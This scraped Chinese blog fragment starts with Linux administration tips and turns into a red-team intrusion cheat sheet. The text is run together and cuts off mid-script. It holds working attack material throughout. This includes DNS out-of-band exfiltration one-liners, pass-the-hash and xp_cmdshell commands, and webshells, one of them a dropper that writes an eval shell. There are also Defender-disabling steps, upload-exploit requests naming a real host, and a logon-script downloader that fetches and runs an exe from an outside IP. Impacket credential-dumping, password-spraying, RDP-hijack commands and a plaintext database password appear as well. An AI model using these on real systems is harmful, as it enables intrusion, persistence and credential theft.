地址:https://github.com/naiba/nezha linux 使用过程中经常出现安装软件包失败的问题,很多情况是遇到了锁,可以直接删除(运维兄弟们,生产环境下不要用啊🤣🤣🤣) debian系 报错：无法获得锁 /var/lib/apt/lists/lock - open (11: 资源暂时不可用) rm -rf /var/cache/apt/archives/lockrm -rf /var/lib/dpkg/lock-frontendrm -rf /var/lib/dpkg/lockrm /var/lib/dpkg/lockrm /var/lib/apt/lists/lock redhat系 报错：/var/run/yum.pid 已被锁定,PID 为 xxxx 的另一个程序正在运行. rm -f /var/run/yum.pid 2&gt; /dev/null 特立独行的 Fedora 报错：Waiting for process with pid to finish. rm -f /var/cache/dnf/metadata_lock.pid 2&gt; /dev/null 在 linux 中安装一些组件的依赖时会有比如 python-dev 和 python-devel 的区别,devel 或 dev 包主要是供开发用，这代表不同的发行版本，redhat 系是 devel ，debian 系是 dev 修改 Linux 的 DNS 一直是一个问题，每次开机 dns 都会重置，debian 下可以使用 dns 管理工具一劳永逸的解决 安装 apt-get install -y resolvconf 配置 echo &quot;nameserver 223.5.5.5&quot; &gt; /etc/resolvconf/resolv.conf.d/head 更新 resolvconf -u 若需要更改 DNS,请修改 /etc/resolvconf/resolv.conf.d/head 文件 如果在 red hat 系发行版中需要装开发工具,建议安装 Development Tools ，可以将常用软件，一次性装好 安装 yum groupinstall -y &quot;Development Tools&quot; 分享几个linux性能调优的技巧 sync # sync 命令做同步,以确保文件系统的完整性,将所有未写的系统缓冲区写到磁盘中,包含已修改的 i-node、已延的块 I/O 和写映射文件.否则在释放缓存的过程中,可能会丢失未保存的文件.echo 1 &gt; /proc/sys/vm/drop_caches # 清理 pagecache(页面缓存)echo 2 &gt; /proc/sys/vm/drop_caches # 清理 dentries(目录缓存)和inodesecho 3 &gt; /proc/sys/vm/drop_caches # 清理 pagecache、dentries 和 inodessync# 取消开启文件数限制ulimit -n 65535# 优化内存echo 128 &gt; /proc/sys/vm/nr_hugepages # 默认为0sysctl -w vm.nr_hugepages=128 最近在 linux 搭建 vpn 服务的时候遇到时间和时区不同步的情况，分享下解决方案 查看当前时区 timedatectl 修改当前时区： timedatectl set-timezone Asia/Shanghai# 或cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtime 由于 python 官方停止了对 python2 的维护，以后大部分和 pip2 有关的操作都会报下面这个错，我预估一下，这个应该是以后我们遇到最常见的问题之一, 解决方案很简单, 安装指定版本的 pip2 即可 curl https://bootstrap.pypa.io/2.7/get-pip.py --output get-pip.pypython get-pip.py Python 2 在 Ubuntu 20 上不存在，但是有时候还是需要的。可以通过以下命令安装 apt-get install python-is-python2 CVE-2020-14386: Linux kernel权限提升漏洞 : 内核提权漏洞，poc：https://www.openwall.com/lists/oss-security/2020/09/03/3 php imap命令执行：imap_open调用rsh连接远程，但是debain默认使用ssh，ssh存在-o雕鹰系统命令，因此存在命令注入。 **各种waf：**https://mp.weixin.qq.com/s/PWkqNsygi-c_S7tW1y_Hxw excel导入打xxe https://xz.aliyun.com/t/3741 启动apache /etc/init.d/apache2 start ssh软连接 https://www.jozxing.cc/archives/1653 apache shiro https://www.cnblogs.com/nul1/p/12827021.html 提权合集 https://mp.weixin.qq.com/s/gijFjloNrEshsSaiMHr8oQ jwt https://xz.aliyun.com/t/6776#toc-10 winrm 执行命令、端口复用 https://blog.csdn.net/k8gege/article/details/106442655 红队工具 https://github.com/root-tools/redtool pth+rdp https://www.dazhuanlan.com/2020/01/18/5e22c1493adef/ privilege::debug sekurlsa::pth /user:administrator /domain:. /ntlm:xxxxxxxxxxxxxxxxxxxxxx &quot;/run:mstsc.exe /restrictedadmin&quot; Copy 条件： Server需要开启Restricted Admin mode Windows 7 和 Windows Server 2008 R2默认不支持，需要安装补丁2871997、2973351 Copy 开启Restricted Admin mode: REG ADD HKLM\\System\\CurrentControlSet\\Control\\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f Copy 设备默认口令 http://www.srxh1314.com/mrkl.html ue上传 https://zhuanlan.zhihu.com/p/42888106 ** 无回显外带** cmd /v /c &quot;whoami &gt; temp &amp;&amp; certutil -encode temp temp2 &amp;&amp; findstr /L /V &quot;CERTIFICATE&quot; temp2 &gt; temp3 &amp;&amp; set /p MYVAR=&lt; temp3 &amp;&amp; set FINAL=!MYVAR!.b9530dbeff7692920356.d.zhack.ca &amp;&amp; nslookup !FINAL!&quot; 或 for /F &quot;delims=\\ tokens=2&quot; %i in ('whoami') do ping -n 1 %i.bm21t3.dnslog.cn Copy pth + rdp sekurlsa::pth /user:administrator /domain:. /ntlm:xxxxxxxxxxxxxxxxxxxxxx &quot;/run:mstsc.exe /restrictedadmin&quot; Copy 清除日志 linux提权： https://mp.weixin.qq.com/s?__biz=MjM5NjA0NjgyMA==&amp;mid=2651102317&amp;idx=1&amp;sn=0b0a840bd30896eb28b02ac117700bad&amp;chksm=bd1f0ee68a6887f00b1bfbf8996d516abfed498e264561e4d022de359beacb96efe10c000733&amp;scene=132#wechat_redirect mssql cmd -- 判断用户 and 1=(select IS_SRVROLEMEMBER('public') )-- and 1=(select IS_SRVROLEMEMBER('sysadmin') )-- and 1=(select IS_SRVROLEMEMBER('db_owner') )-- -- 开启xp_cmdshell EXEC sp_configure 'show advanced options',1 RECONFIGURE EXEC sp_configure 'xp_cmdshell',1 RECONFIGURE EXEC master..xp_cmdshell '123.zpu2he.dnslog.cn' -- RECONFIGURE报错的话就用 reconfigure with override Copy mysqldump mysqldump --defaults-extra-file=/tmp/11.cnf --databases jiebei_com &gt;/home/www/jb.com/runtime/log/202010/jiebei_com.sql Copy [client] port = 3306 socket = /tmp/mysql.sock default-character-set = utf8mb4 host = 127.0.0.1 user = 'jiebei_com' password = 'k7SHT62npa3j8RrS' Copy SimplyEmail ./SimplyEmail.py -all -v -e Copy xray扫描 .\\xray_windows_amd64.exe webscan --listen 127.0.0.1:7777 --html-output zyhy3.htmlpython3 lancher.pyCopy 易受攻击点 https://mp.weixin.qq.com/s/6I-Yp0A69rLr3RfruIAkhA cisco asa任意文件读取 https://github.com/cygenta/CVE-2020-3452/blob/main/CVE-2020-3452.py Exchange CVE-2020-17144 poc: https://srcincite.io/pocs/cve-2020-17141.py.txt CVE-2020-16875 poc: https://srcincite.io/pocs/cve-2020-16875.py.txt citrix xenmobile任意文件读取 /jsp/help-sb-download.jsp?sbFileName=../../../etc/passwdCopy vmware文件读取： https://twitter.com/ptswarm/status/1316016337550938122 内网不出网 https://mp.weixin.qq.com/s/IeH06p7pkQ3lmOehGLUWLg dnscat mysql 8.0新特性 table: TABLE table_name [ORDER BY column_name] [LIMIT number [OFFSET number]]Copy value: select * from users where id = 1 union values row(1,2,3)Copy 当php system没有调用cmd权限 通过建立新的com对象调用其他的cmd.exe &lt;?php$command=$_POST[a];$wsh = new COM('WScript.shell'); // 生成一个COM对象$exec = $wsh-&gt;exec('cmd.exe /c '.$command); //调用对象方法来执行命令$stdout = $exec-&gt;StdOut();$stroutput = $stdout-&gt;ReadAll();echo $stroutput?&gt;Copy xss payload &lt;%00EEEE&lt;svg /\\/\\//ONLoad='a\\u006c\\u0065\\u0072\\u0074(1)'/\\/\\/\\&gt;svg&gt;%0APayloadCopy 通过certutil进行编码解码文件bypass杀软 # 编码Certutil -encode d:\\artifact.exe d:\\artifact.txt# 写入echo sfAFASFAsfasgasdf………&gt;&gt;d:\\1.txt# 解码Certutil -decode d:\\art.txt d:\\art.exeCopy 关闭defender C:\\PROGRA~1\\WINDOW~1&gt;MpCmdRun.exe -RemoveDefinitions -allMpCmdRun.exe -RemoveDefinitions -allService Version: 4.18.1812.3Engine Version: 1.1.17600.5AntiSpyware Signature Version: 1.327.2026.0AntiVirus Signature Version: 1.327.2026.0NRI Engine Version: 1.1.17600.5NRI Signature Version: 1.327.2026.0Starting engine and signature rollback to none...Done!Copy 站库分离操作内容 mysql select @@hostname; //服务端主机名称select * from information_schema.PROCESSLIST; //客户端主机名称和端口select load_file('C:/Windows/System32/drivers/etc/hosts'); //读取文件/etc/hosts/etc/apache2/apache2.conf/etc/httpd/conf/httpd.conf/etc/udev/rules.d/70-persistent-net.rules //获取网卡名称/etc/network/interfaces //DHCP或静态IP/var/lib/dhclient/dhclient--网卡.lease //DHCP/etc/sysconfig/network-scripts/ifcfg-网卡 //静态IPC:/Windows/System32/drivers/etc/hostsC:/Windows/system32/inetsrv/MetaBase.xmlC:/Windows/System32/inetsrv/config/applicationHost.configC:/phpStudy/Apache/conf/httpd.confC:/phpStudy/Apache/conf/vhosts.confC:/phpStudy/PHPTutorial/Apache/conf/httpd.confC:/phpStudy/PHPTutorial/Apache/conf/vhosts.confC:/phpStudy/PHPTutorial/nginx/conf/nginx.confC:/phpStudy/PHPTutorial/nginx/conf/vhosts.confCopy mssql select host_name(); //客户端主机名称select @@servername; //服务端主机名称select serverproperty('MachineName'); //服务端主机名称select name from master.sys.sysdatabases; //查看连接到数据库的机器名select * from master.sys.sysprocesses where dbid= db_id('sqlinject');Copy 模拟令牌 只要有主机在使用Windows身份验证连接到这台数据库服务器的MSSQL时就会保留当前登录用户的令牌，而大多数人又都是以默认Administrator管理员来安装的MSSQL，所以能够直接获取到Administrator令牌。# msfmeterpreter &gt; use IncognitoCopy ashx webshell 会自己生成一个aspx webshell &lt;%@ WebHandler Language=&quot;C#&quot; Class=&quot;Handler&quot; %&gt; using System; using System.Web; using System.IO; public class Handler : IHttpHandler { public void ProcessRequest (HttpContext context) { context.Response.ContentType = &quot;text/plain&quot;; string show=&quot;&lt;%@ Page Language=\\&quot;Jscript\\&quot;%&gt;&lt;%eval(Request.Item[\\&quot;chopper\\&quot;],\\&quot;unsafe\\&quot;);%&gt;&quot;; StreamWriter file1= File.CreateText(context.Server.MapPath(&quot;root.aspx&quot;)); file1.Write(show); file1.Flush(); file1.Close(); } public bool IsReusable { get { return false; } } }Copy ssh 反向端口转发 ssh -R 0.0.0.0:rport:localhost:lport root@x.x.x.xCopy 禁用theme主题 &lt;%@ Page Language=&quot;Jscript&quot; EnableTheming = &quot;False&quot; StylesheetTheme=&quot;&quot; Theme=&quot;&quot; %&gt;Copy ue不出网利用 上传本地 POST /ueditor/net/controller.ashx?action=uploadimage HTTP/1.1Host: pmp.csc.com.cnUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: multipart/form-data; boundary=---------------------------19350128512434Content-Length: 199-----------------------------19350128512434Content-Disposition: form-data; name=&quot;upfile&quot;; filename=&quot;delicious.png&quot;Content-Type: image/png123-----------------------------19350128512434--Copy 抓取本地图片写入webshell POST /ueditor/net/controller.ashx?action=catchimage HTTP/1.1Host: pmp.csc.com.cnUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedContent-Length: 99source%5B%5D=http://127.0.0.1/App_Upload/ueditor/image/20210116/6374641084286323059465749.png?.htmlCopy 如果不成就换几个端口试试 常见web系统弱口令 http://uuzdaisuki.com/2020/11/09/%E5%B8%B8%E8%A7%81web%E7%B3%BB%E7%BB%9F%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4%E6%80%BB%E7%BB%93/ 域外枚举以及爆破 https://github.com/3gstudent/pyKerbrute EnumADUser.py python2 EnumADUser.py 192.168.60.1 test.com user.txt tcp Copy Image ADPwdSpray.py python2 ADPwdSpray.py 192.168.60.1 hacke.testlab user.txt clearpassword QWE123!@# tcp Copy Image python2 ADPwdSpray.py 192.168.60.1 hacke.testlab user.txt ntlmhash 35c83173a6fb6d142b0359381d5cc84c udp Copy Image ","link":"https://1oecho.github.io/voS1XhbeA/"},{"title":"内网渗透：实战思路以及相关命令","content":" 来源于各位大佬，记录做checkList 内网渗透基本流程图： AD域渗透思维导图 域渗透 0~0.9： AD域渗透流程 [TOC] 获取域控权限后，定点打击运维： 至于如何导出 windows 日志,系统其实已经自带了一个非常好用的日志管理工具 即 wevtutil,下面这句话的意思就是把日志 id 为 4624[即登录成功的日志,大部分情况下我们只需要登录成功的]的日志在 4449183132[指定的时间换 算成对应的时间戳]这个时间以内的所有日志都导到指定目录下的 risalogs.evtx 文件中,然后再想办法把这个文件拖到本地来分析 # 域控导出日志： beacon&gt; shell hostname beacon&gt; shell wevtutil epl Security c:\\windows\\logs\\risalogs.evtx /q:&quot;*[EventData[Data[@Name='LogonType']='3'] and System[(EventID=4624) and TimeCreated[timediff(@SystemTime) &lt;= 4449183132]]]&quot; beacon&gt; shell tasklist | findstr &quot;wevtutil.exe&quot; beacon&gt; shell dir c:\\windows\\logs\\risalogs.evtx beacon&gt; download c:\\windows\\logs\\risalogs.evtx beacon&gt; downloads # 本地日志筛洗: LogParser.exe -i:EVT -o csv &quot;SELECT TO_UPPERCASE(EXTRACT_TOKEN(Strings,5,'|')) as NAME,TO_UPPERCASE(EXTRACT_TOKEN(Strings,18,'|')) as IP FROM c:\\risalogs.evtx&quot; &gt; C:\\log.txt # 筛选日志： # grep -v '\\$' log.txt | sort | uniq | egrep -v 'ANONYMOUS LOGON|-|:' &gt; login_succeed.txt # head -n 25 login_succeed.txt # wc -l login_succeed.txt 例子：loecho 为例： # grep 'loecho' login_succeed.txt # 筛选出登录IP # 横向到指定机器-方法1： beacon&gt; shell net use \\\\WIN-HK0SO5MHHQ6\\c$ /user:&quot;study\\Administrator&quot; &quot;hello.!@#45&quot; beacon&gt; shell copy c:\\windows\\logs\\dpx\\cvsrds.exe \\\\WIN-HK0SO5MHHQ6\\admin$\\help\\help\\ beacon&gt; shell dir \\\\WIN-HK0SO5MHHQ6\\admin$\\help\\help\\ beacon&gt; shell wmiexec.exe study/Administrator:hello.!@#45@WIN-HK0SO5MHHQ6 &quot;c:\\windows\\help\\help\\cvsrds.exe&quot; beacon&gt; rm wmiexec.exe beacon&gt; rm cvsrds.exe beacon&gt; shell net use * /del /yes # 横向到指定机器-方法2: 首先,想办法将目标主控机器的 beacon shell 弹回来,之后查看到当前域组策略脚本目录,即 NETLOGON 所对应的路径,等会儿的 vbs payload 就是要上传这个目录下,这样当目标下次重启登录时候就会自动加载执行里面的脚本 beacon&gt; shell net time /domain 如何确定主控,在之前也有提过,net time 即可看到 beacon&gt; shell hostname beacon&gt; shell net share # NETLOGIN脚本目录，上传上线vbs trFileURL = &quot;http://21.65.87.33:80/cvsrds.exe&quot; strHDLocation = &quot;c:\\windows\\temp\\cvsrds.exe&quot; Set objXMLHTTP = CreateObject(&quot;MSXML2.XMLHTTP&quot;) objXMLHTTP.open &quot;GET&quot;, strFileURL, false objXMLHTTP.send() If objXMLHTTP.Status = 200 Then Set objADOStream = CreateObject(&quot;ADODB.Stream&quot;) objADOStream.Open objADOStream.Type = 1 'adTypeBinary objADOStream.Write objXMLHTTP.ResponseBody objADOStream.Position = 0'Set the stream position to the start Set objFSO = Createobject(&quot;Scripting.FileSystemObject&quot;) If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocation Set objFSO = Nothing objADOStream.SaveToFile strHDLocation objADOStream.Close Set objADOStream = Nothing End if Set objXMLHTTP = Nothing strComputer = &quot;.&quot; set ws=wscript.createobject(&quot;wscript.shell&quot;) val=ws.run (&quot;c:\\windows\\temp\\cvsrds.exe&quot;,0 # 如下是最关键的一步,利用 dsmod 修改指定的目标域用户属性,即 给用户添加我们刚刚准备好的登录脚本,具体如下 beacon&gt; shell dsquery user | findstr &quot;boss&quot; beacon&gt; shell dsmod user -loscr &quot;info.vbs&quot; &quot;CN=boss,CN=Users,DC=god,DC=org&quot; beacon&gt; shell gpupdate /force # 一点扩展用法 [ 通过批处理,借助 dsmod,对指定的多个用户批量添加登录脚本,实现域内批量上线,当然啦,实际中并不建议一次种太多,建议有针对性的种 ] # for /f %i in (user.txt) do dsmod user -loscr &quot;info.vbs&quot; &quot;CN=%i,CN=Users,DC=god,DC=org&quot; # type user.txt # 务必记得等所有目标机器都稳定上线之后,立即去把对应的登录脚本都删掉 批量WMI 无依赖横向(445爆破)： # for /f %i in (host.txt) do net use \\\\%i\\admin$ /user:&quot;administrator&quot; &quot;Admin12345&quot; &amp;&amp; if %errorlevel% equ 0 ( echo %i &gt;&gt; c:\\windows\\temp\\login_succeed.txt ) &amp;&amp; net use \\\\%i\\admin$ /del 批量445抓Hash: # for /f %i in (host.txt) do psexec \\\\%i -accepteula -u administrator -p Admin12345 -c C:\\Tools\\QuarksPwDump.exe -dhl -o C:\\windows\\temp\\%i.txt &amp;&amp; move /y \\\\%i\\admin$\\temp\\%i.txt c:\\windows\\temp\\ 批量无依赖PTH: # powershell -exec bypass PS &gt; IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/master/Invoke-TheHash.ps1'); PS &gt; IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/master/Invoke-WMIExec.ps1'); PS &gt; Invoke-TheHash -Type WMIExec -Target 192.168.3.0/24 -Domain . -Username administrator -Hash ccef208c6485269c20db2cad21734fe7 批量上线CS： for /f %i in (host.txt) do net use \\\\%i\\admin$ /user:&quot;administrator&quot; &quot;Admin12345&quot; &amp;&amp; copy C:\\Tools\\beacon.exe \\\\%i\\admin$\\temp\\ &amp;&amp; wmic /node:%i /user:administrator /password:Admin12345 PROCESS call create &quot;\\\\%i\\admin$\\temp\\beacon.exe&quot; &amp;&amp; net use \\\\%i\\admin$ /del impaket 利用手册 0x01 Wmi 以明文密码或 pth 形式远程非交互命令执行 # python3 wmiexec.py ./administrator:'admin!@#45'@172.23.119.106 &quot;quser&quot; -codec gbk # python3 wmiexec.py -hashes :9e62b88124f1d8f8025164799510bc7f klion/sysadm@172.23.119.91 'quser' -codec gbk 远程非交互执行 Cmd 或 PS 命令 # python3 wmiexec.py -shell-type cmd ./administrator:'admin!@#45'@172.23.119.81 &quot;quser&quot; -codec gbk # python3 wmiexec.py -shell-type powershell -hashes :9e62b88124f1d8f8025164799510bc7f klion/sysadm@172.23.119.81 'get-host' -codec gbk Cmd 或 PS, 远程交互式 shell # python3 wmiexec.py -shell-type cmd ./administrator:'abc123!@#45'@172.23.119.109 -codec gbk # python3 wmiexec.py -shell-type powershell -hashes :9e62b88124f1d8f8025164799510bc7f klion/sysadm@172.23.119.109 -codec gbk 加上执行时间标识, 输出详细调试信息(便于后续排查问题),[ 注,默认管道名易被杀软识别 ] # python3 wmiexec.py -ts -debug ./administrator:'Admin12345'@172.23.119.86 &quot;quser&quot; -codec gbk # python3 wmiexec.py -ts -debug -hashes :9e62b88124f1d8f8025164799510bc7f klion/sysadm@172.23.119.119 'net group &quot;domain admins&quot; /domain' -codec gbk 只执行命令,不获取命令结果, 走的单端口,避免由于 445 端口不通而导致整个执行失败 # python3 wmiexec.py -nooutput ./administrator:'abc123!@#45'@172.23.119.82 &quot;quser &gt; C:\\Users\\Public\\Documents\\logs.txt&quot; -codec gbk # python3 wmiexec.py -nooutput -hashes :9e62b88124f1d8f8025164799510bc7f klion/sysadm@172.23.119.82 'tasklist&gt; C:\\Users\\Public\\Documents\\logs.txt' -codec gbk 0x02 Dcom 远程非交互命令执行,支持 ShellWindows, ShellBrowserWindow, MMC20 方法 # python3 dcomexec.py -ts -debug -object MMC20 ./administrator:'admin!@#45'@172.23.119.91 &quot;quser&quot; -codec gbk # python3 dcomexec.py -ts -debug -hashes :9e62b88124f1d8f8025164799510bc7f -object MMC20 klion/sysadm:@172.23.119.91 &quot;quser&quot; -codec gbk Dcom 远程交互 shell # python3 dcomexec.py -ts -debug -object MMC20 ./administrator:'admin!@#45'@172.23.119.91 -codec gbk # python3 dcomexec.py -ts -debug -hashes :9e62b88124f1d8f8025164799510bc7f -shell-type powershell -object MMC20 klion/sysadm:@172.23.119.91 -codec gbk 极易被拦截 0x03 计划任务 远程非交互命令执行, 默认 System 权限 # python3 atexec.py -ts -debug -hashes :9e62b88124f1d8f8025164799510bc7f klion/sysadm@172.23.119.91 &quot;quser&quot; -codec gbk # python3 atexec.py -ts -debug ./administrator:'admin!@#45'@172.23.119.91 'dir c:\\' -codec gbk 0x04 Smb 远程交互 shell, 默认 system 权限 # python3 smbexec.py -ts -debug -hashes :518B98AD4178A53695DC997AA02D455C ./administrator@172.23.119.81 -codec gbk # python3 smbexec.py -ts -debug klion/sysadm:'admin!@#45'@172.23.119.81 -codec gbk # python3 psexec.py -ts -debug -hashes :9e62b88124f1d8f8025164799510bc7f klion/sysadm@172.23.119.51 'net group &quot;domain admins&quot; /domain' # python3 psexec.py -ts -debug ./administrator:'admin!@#45'@172.23.119.106 'net group &quot;domain admins&quot; /domain' # python3 psexec.py -ts -debug ./administrator:'admin!@#45'@172.23.119.106 'net group &quot;domain controllers&quot; /domain' 0x05 远程抓 hash 抓本地 hash 远程在线抓 hash # python3 secretsdump.py -hashes :518B98AD4178A53695DC997AA02D455C ./administrator@172.23.119.51 -outputfile 172.23.119.51.hash.txt 本地离线解 hash # python3 wmiexec.py -hashes :9e62b88124f1d8f8025164799510bc7f klion/sysadm@172.23.119.51 -codec gbk # cd c:\\users\\public\\documents # reg save HKLM\\SYSTEM sys.hiv # reg save HKLM\\SAM sam.hiv # reg save hklm\\security security.hiv # lget sys.hiv # lget security.hiv # lget sam.hiv # python3 secretsdump.py -sam sam.hiv -security security.hiv -system sys.hiv LOCAL -outputfile 6.Hash.txt 导 ntds.dit 远程在线导 ntds.dit # python3 secretsdump.py -hashes :9e62b88124f1d8f8025164799510bc7f klion/sysadm@172.23.119.120 -outputfile klion.local.ntds.txt # python3 secretsdump.py klion/administrator:'Admin12345'@172.23.119.120 -outputfile klion.local.ntds.txt 本地离线解 ntds.dit # python3 wmiexec.py -hashes :9e62b88124f1d8f8025164799510bc7f klion/sysadm@172.23.119.120 -codec gbk # cd c:\\users\\public\\documents # vssadmin list shadows # vssadmin create shadow /for=c: # copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\windows\\NTDS\\ntds.dit c:\\users\\public\\documents\\ntds.dit /Y # vssadmin delete shadows /for=c: /quiet # reg save hklm\\system system.hiv # lput gosecretsdump.exe # gosecretsdump.exe -history -ntds ntds.dit -system system.hiv -out klion.local.txt 目标机上解 # python3 secretsdump.py -system system.hiv -ntds ntds.dit LOCAL -outputfile klion.ntds.dit 拖回来本地解 0x06 域外利用相关 # python3 GetUserSPNs.py klion.local/WenYa.xue:'xwy123!@#45' -dc-ip 172.23.119.120 -request Kerberoasting 利用 # python3 GetNPUsers.py klion.local/sysadm:'sys123!@#45' -dc-ip 172.23.119.120 -request AS-REPRoasting 利用 # python3 GetADUsers.py klion.local/sysadm:'sys123!@#45' -dc-ip 172.23.119.120 -all 抓取目标域内用户列表 # python3 findDelegation.py klion.local/sysadm:'sys123!@#45' -dc-ip 172.23.119.120 查询目标域内委派 # python3 lookupsid.py -ts ./administrator:'admin!@#45'@172.23.119.120 枚举目标系统用户列表(RPC) # python3 netview.py -debug klion.local/sysadm:'sys123!@#45' -dc-ip 172.23.119.120 批量获取域内存活主机的用户登录记录 # python3 getTGT.py -debug klion.local/sysadm:'sys123!@#45' -dc-ip 172.23.119.120 获取指定域用户票据 # python3 getArch.py -target 192.168.159.11 查看目标系统位数 # python3 rpcdump.py ./administrator:'admin!@#45'@172.23.119.120 远程 Dump RPC 数据 0x07 远程提取目标 Exchange 邮箱信息 # python3 exchanger.py -rpc-hostname Ex2010SP3 klion/its:'admin!@#45'@192.168.159.12 nspi list-tables # python3 exchanger.py -rpc-hostname Ex2010SP3 klion/its:'admin!@#45'@192.168.159.12 nspi dump-tables -guid 57f0c459-519c-47f8-9e1b-f83a1f8a51a8 GUEST用户劫持Administere-RDP 登录guest用户，使用rdp劫持登录administrator。 query user sc create tide binpath= &quot;cmd.exe /k tscon 1 /dest:rdp-tcp#4&quot; #1为目标会话id和当前会话名 net start tide 浏览器相关： 1. 浏览器下载记录 2. 浏览器历史记录 3. 浏览器保存的账号密码 4. 浏览器收藏夹标签 # Github项目 https://github.com/GhostPack/Seatbelt # 爬取浏览器收藏夹等机器其他敏感资产 https://github.com/moonD4rk/HackBrowserData # hackbrowserdata 是一个解密浏览器数据（密码|历史记录|Cookies|书签）的导出工具，支持全平台主流浏览器 https://github.com/AlessandroZ/LaZagne # LaZagne项目是用于开源应用程序获取大量的密码存储在本地计算机上 https://github.com/uknowsec/SharpDecryptPwd # 解密常用软件密码，例如navcat,wincap等 最近打开文件： C:\\Users[User]\\AppData\\Roaming\\Microsoft\\Windows\\Recent 防火墙配置 netsh advfirewall show allprofiles RDP连接记录 cmdkey /list reg query &quot;HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\servers&quot; reg query &quot;HKEY_CURRENT_USER\\SOFTWARE\\MICROSOFT\\TERMINAL SERVER CLIENT\\DEFAULT&quot; 启动项查询 wmic startup get command,caption REG QUERY HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run REG QUERY HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run 服务信息 wmic service list brief 查看是否开启DHCP或其他第三方服务 已安装程序 wmic product get name,version rty name,version powershell &quot;Get-WmiObject -class Win32_Product |Select-Object -Property name,version 敏感文件： # Windows: findstr /si password config.* *.ini *.txt *.properties dir /a /s /b d:\\&quot;*.txt&quot; dir /a /s /b d:\\&quot;*.xml&quot; dir /a /s /b d:\\&quot;*.mdb&quot; dir /a /s /b d:\\&quot;*.sql&quot; dir /a /s /b d:\\&quot;*.mdf&quot; dir /a /s /b d:\\&quot;*.eml&quot; dir /a /s /b d:\\&quot;*.pst&quot; dir /a /s /b d:\\&quot;*conf*&quot; dir /a /s /b d:\\&quot;*bak*&quot; dir /a /s /b d:\\&quot;*pwd*&quot; dir /a /s /b d:\\&quot;*pass*&quot; dir /a /s /b d:\\&quot;*login*&quot; dir /a /s /b d:\\&quot;*user*&quot; # Linux find / -name *.properties grep -r &quot;查询内容&quot; 文件目录 #!/bin/bash # by forum.ywhack.com #输出文件 filename=$(date +%s)'.log' echo &quot;信息收集&quot; echo -e &quot;\\n&quot; | tee -a $filename echo &quot;账户信息收集&quot; | tee -a $filename cat /etc/passwd | tee -a $filename echo -e &quot;\\n&quot; | tee -a $filename echo &quot;shadow&quot; | tee -a $filename cat /etc/shadow | tee -a $filename echo -e &quot;\\n&quot; | tee -a $filename echo &quot;进程信息收集&quot; | tee -a $filename ps aux | tee -a $filename echo -e &quot;\\n&quot; | tee -a $filename echo &quot;网络连接&quot; | tee -a $filename netstat -antlp | tee -a $filename echo -e &quot;\\n&quot; | tee -a $filename echo &quot;当前用户:&quot; $(whoami) 2&gt;/dev/null | tee -a $filename echo -e &quot;\\n&quot; | tee -a $filename echo &quot;端口监听&quot; | tee -a $filename netstat -lnpt | tee -a $filename echo -e &quot;\\n&quot; | tee -a $filename echo &quot;可登陆用户&quot; | tee -a $filename cat /etc/passwd | grep -E -v 'nologin$|false' | tee -a $filename echo -e &quot;\\n&quot; | tee -a $filename echo &quot;增加用户的日志&quot; | tee -a $filename grep &quot;useradd&quot; /var/log/secure | tee -a $filename echo -e &quot;\\n&quot; | tee -a $filename echo &quot;History操作提取&quot; | tee -a $filename cat ~/.*history | tee -a $filename echo -e &quot;\\n&quot; | tee -a $filename echo &quot;登录成功的IP&quot; | tee -a $filename grep &quot;Accepted &quot; /var/log/secure* | awk '{print $11}' | sort | uniq -c | sort -nr | more | tee -a $filename echo -e &quot;\\n&quot; | tee -a $filename echo &quot;查看路由表&quot; | tee -a $filename route -n | tee -a $filename echo -e &quot;\\n&quot; | tee -a $filename echo &quot;查看 SSH key&quot; | tee -a $filename sshkey=${HOME}/.ssh/authorized_keys if [ -e &quot;${sshkey}&quot; ]; then cat ${sshkey} | tee -a $filename else echo -e &quot;SSH key文件不存在\\n&quot; | tee -a $filename fi echo -e &quot;\\n&quot; | tee -a $filename echo &quot;查看 known_hosts&quot; | tee -a $filename cat ~/.ssh/known_hosts | tee -a $filename echo -e &quot;\\n&quot; | tee -a $filename echo &quot;查找WEB-INF&quot; | tee -a $filename find / -name *.properties 2&gt;/dev/null | grep WEB-INF | tee -a $filename echo -e &quot;\\n&quot; | tee -a $filename echo &quot;user|pass|pwd|uname|login|db_&quot; | tee -a $filename find / -name &quot;*.properties&quot; | xargs egrep -i &quot;user|pass|pwd|uname|login|db_&quot; | tee -a $filename echo -e &quot;\\n&quot; | tee -a $filename echo &quot;jdbc:|pass=|passwd=&quot; | tee -a $filename find / -regex &quot;.*\\.properties\\|.*\\.conf\\|.*\\.config\\|.*\\.sh&quot; | xargs grep -E &quot;=jdbc:|pass=|passwd=&quot; | tee -a $filename echo -e &quot;\\n&quot; | tee -a $filename # Author cances echo &quot;ip和网卡信息&quot; | tee -a $filename ip a | awk '{print $2,$4}' | tee -a $filename echo -e &quot;\\n&quot; | tee -a $filename echo &quot;可登陆用户&quot; | tee -a $filename cat /etc/passwd | grep -E -v 'sync$|halt$|nologin$|false|shutdown' | tee -a $filename echo -e &quot;\\n&quot; | tee -a $filename echo &quot;用户登陆日志&quot; | tee -a $filename lastlog | tee -a $filename echo -e &quot;\\n&quot; | tee -a $filename echo &quot;查看 